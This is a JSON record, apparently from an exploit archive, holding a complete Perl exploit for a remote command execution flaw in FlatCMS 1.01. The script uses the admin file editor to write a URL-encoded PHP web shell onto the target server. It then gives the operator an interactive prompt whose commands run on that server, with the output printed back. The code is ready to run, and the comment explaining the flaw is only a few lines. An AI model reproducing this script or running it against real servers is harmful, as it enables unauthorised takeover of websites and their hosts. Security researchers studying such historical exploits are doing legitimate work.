{
  "id": "1405",
  "title": "FlatCMS 1.01 - &#039;file_editor.php&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# FlatCMS <=1.01 Remote Command Execution Exploit\r\n#\r\n# Copyright (c) 2005 cijfer <cijfer@netti.fi>\r\n# All rights reserved.\r\n#\r\n# An input validation flaw exists within 'admin/file_editor.php'\r\n# of FlatCMS which can lead to remote command execution. \r\n# Here is where the problem is (line 22 of 97):\r\n#\r\n#\t...\r\n# [1]\tif($save_file != \"\") {\r\n# [2]       \t$f_content = stripslashes(\"$f_content\");\r\n#        \tif(!$f_w = fopen($save_file, w)) {\r\n#              \t\techo (\"Cannot open file (\".\"$save_file\".\")<br />\\n\");\r\n#        \t}\r\n# [3]       \tif(!fwrite($f_w,$f_content)) {\r\n#                \techo (\"File \".\"$save_file\".\" is not writable!<br />\\n\");\r\n#        \t}\r\n#        \techo(\"Done saving file \".\"$save_file\".\"<br />\\n\");\r\n#\t}\r\n#\t...\r\n#\r\n# 1. If $save_file is not empty, use it.\r\n# 2. $f_content filters only slashes? that is all?\r\n# 3. write contents of $f_content into $save_file! :))\r\n#\r\n# kiitos ReZEN (www.xorcrew.net) :))\r\n#\r\n# $Id: cijfer-fcmsxpl.pl,v 0.1 2005/01/04 03:48:00 cijfer Exp cijfer $\r\n\r\nuse LWP::UserAgent;\r\nuse URI::Escape;\r\nuse Getopt::Long;\r\nuse Term::ANSIColor;\r\n\r\n$port = 80;\r\n$res  = GetOptions(\"host=s\" => \\$host, \"dir=s\" => \\$dir, \"port=i\" => \\$port, \"tunnel=s\" => \\$tunnel);\r\n\r\n&usage unless $host and $dir;\r\n\r\nwhile()\r\n{\r\n\tprint color(\"green\"), \"cijfer\\$ \", color(\"reset\"); # colors :))!\r\n\tchomp($command = <STDIN>);\r\n\texit unless $command;\r\n\t&exploit($command);\r\n}\r\n\r\nsub usage\r\n{\r\n\tprint \"FlatCMS <=1.01 Remote Command Execution Exploit\\n\";\r\n\tprint \"Usage: $0 -hd [OPTION]...\\n\\n\";\r\n\tprint \"  -h --host\\thostname or ip of target\\n\";\r\n\tprint \"  -d --dir\\tdirectory without ending slash\\n\";\r\n\tprint \"  -p --port\\tport number (default: 80)\\n\";\r\n\tprint \"  -t --tunnel\\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub exploit\r\n{\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 [en] (X11; I; SunOS 5.6 sun4u)\");\r\n\t$cij->proxy(\"http\", \"http://\".$tunnel.\"/\") unless !$tunnel;\r\n\r\n\t$string  = \"echo%20_cijfer_%3B\";\r\n\t$string .= uri_escape(shift);\r\n\t$string .= \"%3Becho%20_cijfer_\";\r\n\r\n\t$execut  = \"%3C%3F%24handle%3Dpopen%5C%28%24_GET%5Bcij%5D%2C%22r%22%29%3Bwhile%28%21feof\";\r\n\t$execut .= \"%28%24handle%29%29%7B%24line%3Dfgets%28%24handle%29%3Bif%28strlen%28%24line%\";\r\n\t$execut .= \"29%3E%3D1%29%7Becho%22%24line%22%3B%7D%7Dpclose%28%24handle%29%3B%3F%3E\";\r\n\r\n\t$path = \"http://\".$host.$dir.\"/admin/file_editor.php\";\r\n\t$out=$cij->get($path.\"?save_file=cijfer.php&f_content=\".$execut);\r\n\t$out=$cij->get(\"http://\".$host.$dir.\"/admin/cijfer.php?cij=\".$string);\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\t@cij=split(\"_cijfer_\",$out->content);\r\n\t\tprint substr(@cij[1],1);\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2006-01-04]",
  "url": "https://www.exploit-db.com/exploits/1405"
}